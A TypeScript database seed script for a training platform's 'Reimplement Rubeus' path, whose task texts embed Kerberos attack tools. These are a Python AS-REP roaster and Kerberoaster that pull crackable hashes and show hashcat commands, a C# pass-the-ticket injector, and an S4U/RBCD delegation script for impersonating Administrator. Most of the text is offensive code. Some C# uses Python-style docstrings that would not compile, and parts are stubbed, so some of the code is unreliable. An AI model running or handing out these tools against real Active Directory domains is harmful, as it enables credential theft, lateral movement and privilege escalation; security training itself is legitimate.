#!/usr/bin/env npx tsx
/**
 * Seed: Rubeus & Active Directory Tools
 * Kerberos attacks and AD enumeration
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// RUBEUS REIMPLEMENTATION
// ============================================================================
const rubeusPath = insertPath.run(
	'Reimplement: Rubeus (Kerberos Attacks)',
	'Complete reimplementation of Rubeus for Kerberos attacks. AS-REP roasting, Kerberoasting, ticket manipulation, S4U delegation, and constrained delegation abuse.',
	'purple',
	'C#+Python',
	'advanced',
	12,
	'Kerberos, Active Directory, S4U, delegation, roasting, tickets',
	now
);

const rubMod1 = insertModule.run(rubeusPath.lastInsertRowid, 'Kerberos Roasting Attacks', 'AS-REP and Kerberoasting', 0, now);

insertTask.run(rubMod1.lastInsertRowid, 'Build AS-REP Roaster', 'Identify accounts with Kerberos pre-authentication disabled, request AS-REP responses containing the encrypted timestamp, and extract the crackable portion for offline password attacks without any prior authentication', `## AS-REP Roasting Implementation

### Overview
Extract AS-REP hashes from accounts without Kerberos pre-authentication.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
AS-REP Roaster - Get hashes from accounts without preauth
Similar to Rubeus asreproast and Impacket GetNPUsers
"""

import socket
import struct
import os
from datetime import datetime, timedelta
from typing import Optional, List
from dataclasses import dataclass
import ldap3
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, TGS_REP
from impacket.krb5.types import Principal, KerberosTime
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue


@dataclass
class ASREPHash:
    username: str
    domain: str
    hash_type: int  # 18=AES256, 23=RC4
    hash_value: str


class ASREPRoaster:
    """AS-REP Roasting attack"""

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip

    def find_vuln_users_ldap(
        self,
        username: str,
        password: str
    ) -> List[str]:
        """Find users with 'Do not require Kerberos preauthentication'"""

        server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=f"{self.domain}\\\\{username}",
            password=password,
            authentication=ldap3.NTLM
        )
        conn.bind()

        # Search for accounts with DONT_REQ_PREAUTH flag (0x400000)
        search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        base_dn = ','.join([f"DC={x}" for x in self.domain.split('.')])

        conn.search(
            base_dn,
            search_filter,
            attributes=['sAMAccountName']
        )

        users = [entry.sAMAccountName.value for entry in conn.entries]
        conn.unbind()

        return users

    def roast_user(
        self,
        username: str,
        etype: int = 23  # RC4 by default
    ) -> Optional[ASREPHash]:
        """Request AS-REP for user without preauth"""

        # Build AS-REQ without preauth
        as_req = self._build_as_req(username, etype)

        # Send to KDC
        response = self._send_kerberos(as_req)

        if not response:
            return None

        # Parse AS-REP
        as_rep, _ = decoder.decode(response, asn1Spec=AS_REP())

        # Check for errors
        if as_rep['error-code']:
            error = as_rep['error-code']
            if error == 6:  # KDC_ERR_C_PRINCIPAL_UNKNOWN
                print(f"[-] User {username} not found")
            elif error == 18:  # KDC_ERR_PREAUTH_REQUIRED
                print(f"[-] User {username} requires preauth")
            return None

        # Extract encrypted part
        enc_part = as_rep['enc-part']
        etype = int(enc_part['etype'])
        cipher = bytes(enc_part['cipher'])

        # Format hash for hashcat/john
        hash_value = self._format_hash(username, etype, cipher)

        return ASREPHash(
            username=username,
            domain=self.domain,
            hash_type=etype,
            hash_value=hash_value
        )

    def _build_as_req(self, username: str, etype: int) -> bytes:
        """Build AS-REQ without padata (no preauth)"""

        # Client principal
        client_principal = Principal(
            username,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        # Server principal (krbtgt)
        server_principal = Principal(
            f"krbtgt/{self.domain.upper()}",
            type=constants.PrincipalNameType.NT_SRV_INST.value
        )

        # Timestamps
        now = datetime.utcnow()
        till = now + timedelta(days=1)

        # Build AS-REQ structure
        as_req = AS_REQ()

        # pvno
        as_req['pvno'] = 5
        as_req['msg-type'] = 10  # AS-REQ

        # req-body
        req_body = as_req['req-body']
        req_body['kdc-options'] = constants.encodeFlags([
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.proxiable.value
        ])

        # cname
        seq_set(req_body, 'cname', client_principal.components_to_asn1)

        # realm
        req_body['realm'] = self.domain.upper()

        # sname
        seq_set(req_body, 'sname', server_principal.components_to_asn1)

        # till
        req_body['till'] = KerberosTime.to_asn1(till)

        # rtime
        req_body['rtime'] = KerberosTime.to_asn1(till)

        # nonce
        req_body['nonce'] = int.from_bytes(os.urandom(4), 'big')

        # etype - request RC4 or AES
        req_body['etype'] = [etype]

        return encoder.encode(as_req)

    def _send_kerberos(self, data: bytes) -> Optional[bytes]:
        """Send Kerberos message to KDC"""

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        try:
            sock.connect((self.dc_ip, 88))

            # Send length + data
            sock.send(struct.pack('>I', len(data)) + data)

            # Receive length
            length_bytes = sock.recv(4)
            length = struct.unpack('>I', length_bytes)[0]

            # Receive data
            response = b''
            while len(response) < length:
                response += sock.recv(length - len(response))

            return response

        except Exception as e:
            print(f"[-] Kerberos error: {e}")
            return None
        finally:
            sock.close()

    def _format_hash(self, username: str, etype: int, cipher: bytes) -> str:
        """Format hash for cracking tools"""

        if etype == 23:  # RC4
            # $krb5asrep$23$user@DOMAIN:checksum$cipher
            checksum = cipher[:16].hex()
            enc_data = cipher[16:].hex()
            return f"\$krb5asrep\$23\${username}@{self.domain.upper()}:{checksum}\${enc_data}"

        elif etype == 18:  # AES256
            # $krb5asrep$18$user@DOMAIN:cipher
            return f"\$krb5asrep\$18\${username}@{self.domain.upper()}:{cipher.hex()}"

        return cipher.hex()

    def roast_users(self, users: List[str]) -> List[ASREPHash]:
        """Roast multiple users"""
        hashes = []

        for user in users:
            print(f"[*] Trying {user}...")
            result = self.roast_user(user)
            if result:
                print(f"[+] Got hash for {user}")
                hashes.append(result)

        return hashes


def main():
    import argparse

    parser = argparse.ArgumentParser(description='AS-REP Roaster')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-dc', '--dc-ip', required=True)
    parser.add_argument('-u', '--user', help='Single user to roast')
    parser.add_argument('-U', '--users-file', help='File with usernames')
    parser.add_argument('-l', '--ldap-user', help='LDAP user for enumeration')
    parser.add_argument('-p', '--ldap-pass', help='LDAP password')
    parser.add_argument('-o', '--output', help='Output file for hashes')

    args = parser.parse_args()

    roaster = ASREPRoaster(args.domain, args.dc_ip)
    users = []

    # Get users to roast
    if args.user:
        users = [args.user]
    elif args.users_file:
        with open(args.users_file) as f:
            users = [line.strip() for line in f if line.strip()]
    elif args.ldap_user and args.ldap_pass:
        print("[*] Enumerating users via LDAP...")
        users = roaster.find_vuln_users_ldap(args.ldap_user, args.ldap_pass)
        print(f"[+] Found {len(users)} users without preauth")

    if not users:
        print("[-] No users to roast")
        return

    # Roast
    hashes = roaster.roast_users(users)

    # Output
    print(f"\\n[+] Got {len(hashes)} hashes")

    for h in hashes:
        print(h.hash_value)

    if args.output:
        with open(args.output, 'w') as f:
            for h in hashes:
                f.write(h.hash_value + '\\n')
        print(f"[+] Saved to {args.output}")


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Single user
python asreproast.py -d corp.local -dc 192.168.1.1 -u svc_account

# From user list
python asreproast.py -d corp.local -dc 192.168.1.1 -U users.txt -o hashes.txt

# Auto-enumerate via LDAP
python asreproast.py -d corp.local -dc 192.168.1.1 -l admin -p password

# Crack with hashcat
hashcat -m 18200 hashes.txt wordlist.txt
\`\`\`
`, 0, now);

insertTask.run(rubMod1.lastInsertRowid, 'Build Kerberoaster', 'Request TGS tickets for SPNs registered to service accounts and extract the encrypted portions for offline password cracking, exploiting that any domain user can request service tickets encrypted with the service account password hash', `## Kerberoasting Implementation

### Overview
Request service tickets for SPNs and extract hashes for offline cracking.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
Kerberoaster - Extract service ticket hashes
"""

import socket
import struct
import os
from datetime import datetime, timedelta
from typing import Optional, List, Tuple
from dataclasses import dataclass
import ldap3
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, AS_REP, TGS_REQ, TGS_REP, AP_REQ
from impacket.krb5.asn1 import Authenticator, EncryptedData
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.crypto import Key, _enctype_table
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue


@dataclass
class KerberoastHash:
    spn: str
    username: str
    domain: str
    hash_type: int
    hash_value: str


class Kerberoaster:
    """Kerberoasting attack implementation"""

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip
        self.tgt = None
        self.session_key = None

    def authenticate(self, username: str, password: str) -> bool:
        """Get TGT for authenticated requests"""

        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal

        client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                client,
                password,
                self.domain,
                lmhash='',
                nthash='',
                aesKey='',
                kdcHost=self.dc_ip
            )
            self.tgt = tgt
            self.session_key = sessionKey
            return True
        except Exception as e:
            print(f"[-] Authentication failed: {e}")
            return False

    def authenticate_hash(self, username: str, nt_hash: str) -> bool:
        """Authenticate using NT hash"""

        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5.types import Principal

        client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                client,
                '',
                self.domain,
                lmhash='',
                nthash=nt_hash,
                aesKey='',
                kdcHost=self.dc_ip
            )
            self.tgt = tgt
            self.session_key = sessionKey
            return True
        except Exception as e:
            print(f"[-] Authentication failed: {e}")
            return False

    def find_spns_ldap(self, username: str, password: str) -> List[Tuple[str, str]]:
        """Find user accounts with SPNs via LDAP"""

        server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=f"{self.domain}\\\\{username}",
            password=password,
            authentication=ldap3.NTLM
        )
        conn.bind()

        base_dn = ','.join([f"DC={x}" for x in self.domain.split('.')])

        # Find user accounts with SPNs (not machine accounts)
        search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))"

        conn.search(
            base_dn,
            search_filter,
            attributes=['sAMAccountName', 'servicePrincipalName']
        )

        results = []
        for entry in conn.entries:
            username = entry.sAMAccountName.value
            spns = entry.servicePrincipalName.values
            for spn in spns:
                results.append((username, spn))

        conn.unbind()
        return results

    def roast_spn(self, spn: str, etype: int = 23) -> Optional[KerberoastHash]:
        """Request service ticket for SPN"""

        if not self.tgt:
            print("[-] Not authenticated - call authenticate() first")
            return None

        from impacket.krb5.kerberosv5 import getKerberosTGS
        from impacket.krb5.types import Principal

        server = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

        try:
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                server,
                self.domain,
                self.tgt,
                self.session_key,
                self.session_key,
                self.dc_ip,
                requestEtype=etype
            )

            # Extract encrypted part
            tgs_rep, _ = decoder.decode(tgs, asn1Spec=TGS_REP())
            enc_part = tgs_rep['ticket']['enc-part']

            etype = int(enc_part['etype'])
            cipher = bytes(enc_part['cipher'])

            # Format hash
            hash_value = self._format_hash(spn, etype, cipher)

            # Extract username from SPN
            username = spn.split('/')[0] if '/' in spn else spn

            return KerberoastHash(
                spn=spn,
                username=username,
                domain=self.domain,
                hash_type=etype,
                hash_value=hash_value
            )

        except Exception as e:
            print(f"[-] Failed to roast {spn}: {e}")
            return None

    def _format_hash(self, spn: str, etype: int, cipher: bytes) -> str:
        """Format hash for hashcat/john"""

        if etype == 23:  # RC4
            # $krb5tgs$23$*user$realm$spn*$checksum$cipher
            checksum = cipher[:16].hex()
            enc_data = cipher[16:].hex()
            user = spn.split('/')[0] if '/' in spn else 'user'
            return f"\$krb5tgs\$23\$*{user}\${self.domain.upper()}\${spn}*\${checksum}\${enc_data}"

        elif etype == 18:  # AES256
            return f"\$krb5tgs\$18\$*{spn}\${self.domain.upper()}*\${cipher.hex()}"

        elif etype == 17:  # AES128
            return f"\$krb5tgs\$17\$*{spn}\${self.domain.upper()}*\${cipher.hex()}"

        return cipher.hex()

    def roast_all(self, spns: List[Tuple[str, str]]) -> List[KerberoastHash]:
        """Roast all discovered SPNs"""

        hashes = []

        for username, spn in spns:
            print(f"[*] Roasting {spn} ({username})...")
            result = self.roast_spn(spn)
            if result:
                result.username = username
                hashes.append(result)
                print(f"[+] Got hash for {username}")

        return hashes


def main():
    import argparse

    parser = argparse.ArgumentParser(description='Kerberoaster')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-dc', '--dc-ip', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password')
    parser.add_argument('-H', '--hash', help='NT hash')
    parser.add_argument('-s', '--spn', help='Single SPN to roast')
    parser.add_argument('-o', '--output', help='Output file')

    args = parser.parse_args()

    roaster = Kerberoaster(args.domain, args.dc_ip)

    # Authenticate
    if args.hash:
        if not roaster.authenticate_hash(args.username, args.hash):
            return
    elif args.password:
        if not roaster.authenticate(args.username, args.password):
            return
    else:
        print("[-] Need password or hash")
        return

    print("[+] Authenticated successfully")

    # Get SPNs
    if args.spn:
        spns = [('unknown', args.spn)]
    else:
        print("[*] Enumerating SPNs via LDAP...")
        spns = roaster.find_spns_ldap(args.username, args.password or '')
        print(f"[+] Found {len(spns)} SPNs")

    # Roast
    hashes = roaster.roast_all(spns)

    print(f"\\n[+] Got {len(hashes)} hashes")

    for h in hashes:
        print(f"\\n{h.username}:")
        print(h.hash_value)

    if args.output:
        with open(args.output, 'w') as f:
            for h in hashes:
                f.write(h.hash_value + '\\n')


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# With password
python kerberoast.py -d corp.local -dc 192.168.1.1 -u user -p password

# With NT hash
python kerberoast.py -d corp.local -dc 192.168.1.1 -u user -H aad3b435b51404ee

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
\`\`\`
`, 1, now);

// Module 2: Ticket Operations
const rubMod2 = insertModule.run(rubeusPath.lastInsertRowid, 'Ticket Operations', 'Ticket extraction and injection', 1, now);

insertTask.run(rubMod2.lastInsertRowid, 'Build Pass-the-Ticket Tool', 'Import and inject Kerberos tickets into the current session or memory, enabling authentication to network services using harvested or forged tickets without knowing the underlying password or NTLM hash', `## Pass-the-Ticket Implementation

### Overview
Extract, save, and inject Kerberos tickets for lateral movement.

### C# Implementation
\`\`\`csharp
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;

namespace Rubeus
{
    public class TicketOperations
    {
        // Kerberos SSPI imports
        [DllImport("secur32.dll", SetLastError = true)]
        static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern int LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            ref LSA_STRING PackageName,
            out uint AuthenticationPackage);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern int LsaCallAuthenticationPackage(
            IntPtr LsaHandle,
            uint AuthenticationPackage,
            IntPtr ProtocolSubmitBuffer,
            int SubmitBufferLength,
            out IntPtr ProtocolReturnBuffer,
            out int ReturnBufferLength,
            out int ProtocolStatus);

        [DllImport("secur32.dll")]
        static extern int LsaFreeReturnBuffer(IntPtr Buffer);

        [DllImport("secur32.dll")]
        static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

        [StructLayout(LayoutKind.Sequential)]
        struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct KERB_SUBMIT_TKT_REQUEST
        {
            public int MessageType;
            public LUID LogonId;
            public int Flags;
            public KERB_CRYPTO_KEY32 Key;
            public int KerbCredSize;
            public int KerbCredOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public int Length;
            public int Offset;
        }

        const int KerbQueryTicketCacheMessage = 1;
        const int KerbRetrieveEncodedTicketMessage = 8;
        const int KerbSubmitTicketMessage = 10;
        const int KerbPurgeTicketCacheMessage = 7;

        private IntPtr _lsaHandle;
        private uint _kerberosPackage;

        public bool Connect()
        {
            int status = LsaConnectUntrusted(out _lsaHandle);
            if (status != 0)
            {
                Console.WriteLine($"[-] LsaConnectUntrusted failed: 0x{status:X}");
                return false;
            }

            // Get Kerberos package ID
            LSA_STRING packageName = new LSA_STRING
            {
                Buffer = Marshal.StringToHGlobalAnsi("Kerberos"),
                Length = 8,
                MaximumLength = 9
            };

            status = LsaLookupAuthenticationPackage(
                _lsaHandle, ref packageName, out _kerberosPackage);

            Marshal.FreeHGlobal(packageName.Buffer);

            if (status != 0)
            {
                Console.WriteLine($"[-] LsaLookupAuthenticationPackage failed: 0x{status:X}");
                return false;
            }

            return true;
        }

        public List<TicketInfo> Triage()
        {
            """List all tickets in current session"""

            var tickets = new List<TicketInfo>();

            if (!Connect())
                return tickets;

            // Query ticket cache
            var request = new KERB_QUERY_TKT_CACHE_REQUEST
            {
                MessageType = KerbQueryTicketCacheMessage,
                LogonId = new LUID { LowPart = 0, HighPart = 0 }
            };

            int requestSize = Marshal.SizeOf(request);
            IntPtr requestPtr = Marshal.AllocHGlobal(requestSize);
            Marshal.StructureToPtr(request, requestPtr, false);

            int status = LsaCallAuthenticationPackage(
                _lsaHandle,
                _kerberosPackage,
                requestPtr,
                requestSize,
                out IntPtr responsePtr,
                out int responseLength,
                out int protocolStatus);

            Marshal.FreeHGlobal(requestPtr);

            if (status != 0 || protocolStatus != 0)
            {
                Console.WriteLine($"[-] Query failed: 0x{status:X} / 0x{protocolStatus:X}");
                return tickets;
            }

            // Parse response - ticket cache entries
            // ...

            LsaFreeReturnBuffer(responsePtr);
            return tickets;
        }

        public byte[] Dump(string serviceName = null)
        {
            """Extract ticket as .kirbi"""

            // Request encoded ticket
            // ...

            return null;
        }

        public bool Ptt(byte[] kirbiData)
        {
            """Pass-the-Ticket - inject ticket into session"""

            if (!Connect())
                return false;

            // Build KERB_SUBMIT_TKT_REQUEST
            int totalSize = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>() + kirbiData.Length;
            IntPtr buffer = Marshal.AllocHGlobal(totalSize);

            var request = new KERB_SUBMIT_TKT_REQUEST
            {
                MessageType = KerbSubmitTicketMessage,
                LogonId = new LUID { LowPart = 0, HighPart = 0 },
                Flags = 0,
                KerbCredSize = kirbiData.Length,
                KerbCredOffset = Marshal.SizeOf<KERB_SUBMIT_TKT_REQUEST>()
            };

            Marshal.StructureToPtr(request, buffer, false);
            Marshal.Copy(kirbiData, 0,
                IntPtr.Add(buffer, request.KerbCredOffset),
                kirbiData.Length);

            int status = LsaCallAuthenticationPackage(
                _lsaHandle,
                _kerberosPackage,
                buffer,
                totalSize,
                out IntPtr responsePtr,
                out int responseLength,
                out int protocolStatus);

            Marshal.FreeHGlobal(buffer);

            if (responsePtr != IntPtr.Zero)
                LsaFreeReturnBuffer(responsePtr);

            if (status != 0 || protocolStatus != 0)
            {
                Console.WriteLine($"[-] PTT failed: 0x{status:X} / 0x{protocolStatus:X}");
                return false;
            }

            Console.WriteLine("[+] Ticket successfully imported");
            return true;
        }

        public bool Purge()
        {
            """Purge all tickets from session"""

            if (!Connect())
                return false;

            var request = new KERB_QUERY_TKT_CACHE_REQUEST
            {
                MessageType = KerbPurgeTicketCacheMessage,
                LogonId = new LUID { LowPart = 0, HighPart = 0 }
            };

            int size = Marshal.SizeOf(request);
            IntPtr buffer = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(request, buffer, false);

            int status = LsaCallAuthenticationPackage(
                _lsaHandle,
                _kerberosPackage,
                buffer,
                size,
                out IntPtr responsePtr,
                out int responseLength,
                out int protocolStatus);

            Marshal.FreeHGlobal(buffer);

            if (responsePtr != IntPtr.Zero)
                LsaFreeReturnBuffer(responsePtr);

            Console.WriteLine("[+] Tickets purged");
            return true;
        }

        public void Disconnect()
        {
            if (_lsaHandle != IntPtr.Zero)
            {
                LsaDeregisterLogonProcess(_lsaHandle);
                _lsaHandle = IntPtr.Zero;
            }
        }
    }

    public class TicketInfo
    {
        public string ServerName { get; set; }
        public string ClientName { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public int EncryptionType { get; set; }
        public int Flags { get; set; }
    }

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage:");
                Console.WriteLine("  Rubeus.exe triage");
                Console.WriteLine("  Rubeus.exe dump /service:krbtgt");
                Console.WriteLine("  Rubeus.exe ptt /ticket:file.kirbi");
                Console.WriteLine("  Rubeus.exe purge");
                return;
            }

            var ops = new TicketOperations();

            switch (args[0].ToLower())
            {
                case "triage":
                    var tickets = ops.Triage();
                    foreach (var t in tickets)
                    {
                        Console.WriteLine($"{t.ClientName} -> {t.ServerName}");
                        Console.WriteLine($"  Start: {t.StartTime}");
                        Console.WriteLine($"  End: {t.EndTime}");
                    }
                    break;

                case "ptt":
                    string ticketPath = args.Length > 1 ? args[1] : null;
                    if (ticketPath != null && ticketPath.StartsWith("/ticket:"))
                    {
                        ticketPath = ticketPath.Substring(8);
                        byte[] ticketData = File.ReadAllBytes(ticketPath);
                        ops.Ptt(ticketData);
                    }
                    break;

                case "purge":
                    ops.Purge();
                    break;
            }

            ops.Disconnect();
        }
    }
}
\`\`\`

### Linux ccache Support
\`\`\`python
#!/usr/bin/env python3
"""
Pass-the-Ticket on Linux using ccache
"""

import os
import struct
from pathlib import Path


def kirbi_to_ccache(kirbi_path: str, ccache_path: str):
    """Convert .kirbi to ccache format"""

    with open(kirbi_path, 'rb') as f:
        kirbi_data = f.read()

    # Parse kirbi (KRB-CRED structure)
    # Convert to ccache format
    ccache = bytearray()

    # ccache header
    ccache += struct.pack('>HH', 0x0504, 0)  # Version

    # Default principal
    # ...

    # Credentials
    # ...

    with open(ccache_path, 'wb') as f:
        f.write(ccache)


def inject_ccache(ccache_path: str):
    """Set KRB5CCNAME environment variable"""
    os.environ['KRB5CCNAME'] = ccache_path
    print(f"[+] Set KRB5CCNAME={ccache_path}")
    print("[*] Use 'klist' to verify tickets")


if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: ptt.py <ticket.kirbi|ticket.ccache>")
        sys.exit(1)

    ticket_path = sys.argv[1]

    if ticket_path.endswith('.kirbi'):
        ccache_path = ticket_path.replace('.kirbi', '.ccache')
        kirbi_to_ccache(ticket_path, ccache_path)
        inject_ccache(ccache_path)
    else:
        inject_ccache(ticket_path)
\`\`\`
`, 0, now);

// Module 3: Delegation Attacks
const rubMod3 = insertModule.run(rubeusPath.lastInsertRowid, 'Delegation Attacks', 'S4U and delegation abuse', 2, now);

insertTask.run(rubMod3.lastInsertRowid, 'Build S4U Attack Tool', 'Exploit Kerberos S4U2Self and S4U2Proxy protocol extensions to impersonate arbitrary users to delegated services, abusing constrained and resource-based constrained delegation configurations for privilege escalation', `## S4U Delegation Attacks

### Overview
Abuse S4U2Self and S4U2Proxy for constrained delegation attacks.

### Python Implementation
\`\`\`python
#!/usr/bin/env python3
"""
S4U Delegation Attack Tool
Abuse constrained delegation for privilege escalation
"""

from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.krb5.asn1 import TGS_REQ, TGS_REP, AP_REQ, Authenticator
from impacket.krb5.asn1 import PA_FOR_USER_ENC, S4UUserID, S4U2Proxy
from impacket.krb5.crypto import Key, _enctype_table
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue
import struct
import os


class S4UAttack:
    """
    S4U2Self - Get ticket on behalf of user (impersonation)
    S4U2Proxy - Use impersonation ticket for delegation
    """

    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip

    def s4u2self(
        self,
        service_user: str,
        service_password: str,
        impersonate_user: str
    ) -> tuple:
        """
        S4U2Self - Request ticket on behalf of another user

        Requires: Service account with TRUSTED_TO_AUTH_FOR_DELEGATION
        Returns: Forwardable ticket for impersonate_user
        """

        print(f"[*] S4U2Self: {service_user} impersonating {impersonate_user}")

        # Get TGT for service account
        service_principal = Principal(
            service_user,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            service_principal,
            service_password,
            self.domain,
            kdcHost=self.dc_ip
        )

        print("[+] Got TGT for service account")

        # Build S4U2Self request
        # Request ticket for impersonate_user to access service_user

        # Build PA-FOR-USER padata
        pa_for_user = PA_FOR_USER_ENC()
        pa_for_user['userName'] = Principal(
            impersonate_user,
            type=constants.PrincipalNameType.NT_ENTERPRISE.value
        ).components_to_asn1

        pa_for_user['userRealm'] = self.domain.upper()
        pa_for_user['auth-package'] = 'Kerberos'

        # Sign with session key
        checksum = self._compute_s4u_checksum(
            pa_for_user, sessionKey
        )
        pa_for_user['cksum'] = checksum

        # Build TGS-REQ for S4U2Self
        server_principal = Principal(
            service_user,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        s4u_tgs = getKerberosTGS(
            server_principal,
            self.domain,
            tgt,
            sessionKey,
            sessionKey,
            self.dc_ip,
            paForUser=encoder.encode(pa_for_user)
        )

        print(f"[+] Got S4U2Self ticket for {impersonate_user}")

        return s4u_tgs

    def s4u2proxy(
        self,
        service_user: str,
        service_password: str,
        impersonate_user: str,
        target_spn: str
    ) -> tuple:
        """
        S4U2Proxy - Use impersonation ticket for delegation

        Requires: Service account with constrained delegation to target_spn
        Returns: Ticket for impersonate_user to access target_spn
        """

        print(f"[*] S4U2Proxy: {impersonate_user} -> {target_spn}")

        # First get S4U2Self ticket
        s4u_self_ticket = self.s4u2self(
            service_user, service_password, impersonate_user
        )

        # Now use that ticket for S4U2Proxy
        # Get fresh TGT
        service_principal = Principal(
            service_user,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            service_principal,
            service_password,
            self.domain,
            kdcHost=self.dc_ip
        )

        # Build S4U2Proxy request
        target_principal = Principal(
            target_spn,
            type=constants.PrincipalNameType.NT_SRV_INST.value
        )

        # Include S4U2Self ticket as additional ticket
        s4u_proxy_tgs = getKerberosTGS(
            target_principal,
            self.domain,
            tgt,
            sessionKey,
            sessionKey,
            self.dc_ip,
            additionalTicket=s4u_self_ticket[0]
        )

        print(f"[+] Got S4U2Proxy ticket for {impersonate_user} to {target_spn}")

        return s4u_proxy_tgs

    def _compute_s4u_checksum(self, pa_for_user, session_key):
        """Compute checksum for PA-FOR-USER"""

        # Encode PA-FOR-USER without checksum
        data = encoder.encode(pa_for_user)

        # Compute HMAC-MD5
        from Crypto.Hash import HMAC, MD5
        hmac = HMAC.new(session_key.contents, data, MD5)

        return {
            'cksumtype': 0xFFFFFF76,  # HMAC-MD5
            'checksum': hmac.digest()
        }

    def rbcd_attack(
        self,
        controlled_computer: str,
        controlled_password: str,
        target_computer: str,
        impersonate_user: str = "Administrator"
    ):
        """
        Resource-Based Constrained Delegation attack

        Requires: GenericWrite on target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
        """

        print(f"[*] RBCD: {controlled_computer} -> {target_computer}")

        # S4U2Self to get ticket as Administrator
        s4u_self = self.s4u2self(
            controlled_computer + "$",
            controlled_password,
            impersonate_user
        )

        # S4U2Proxy to target
        target_spn = f"cifs/{target_computer}.{self.domain}"

        # Note: For RBCD, the delegation permission is on the TARGET
        # not the controlled computer, so this uses different logic

        print(f"[+] Got ticket for {impersonate_user} to access {target_computer}")


def main():
    import argparse

    parser = argparse.ArgumentParser(description='S4U Attack Tool')
    parser.add_argument('-d', '--domain', required=True)
    parser.add_argument('-dc', '--dc-ip', required=True)
    parser.add_argument('-u', '--user', required=True, help='Service account')
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-i', '--impersonate', required=True, help='User to impersonate')
    parser.add_argument('-s', '--spn', help='Target SPN for S4U2Proxy')
    parser.add_argument('-o', '--output', help='Output ticket file')

    args = parser.parse_args()

    attack = S4UAttack(args.domain, args.dc_ip)

    if args.spn:
        # Full S4U2Proxy attack
        ticket = attack.s4u2proxy(
            args.user,
            args.password,
            args.impersonate,
            args.spn
        )
    else:
        # Just S4U2Self
        ticket = attack.s4u2self(
            args.user,
            args.password,
            args.impersonate
        )

    if args.output:
        # Save ticket
        with open(args.output, 'wb') as f:
            f.write(ticket[0])
        print(f"[+] Saved ticket to {args.output}")


if __name__ == '__main__':
    main()
\`\`\`

### Attack Scenarios

1. **Constrained Delegation**
   - Service has msDS-AllowedToDelegateTo set
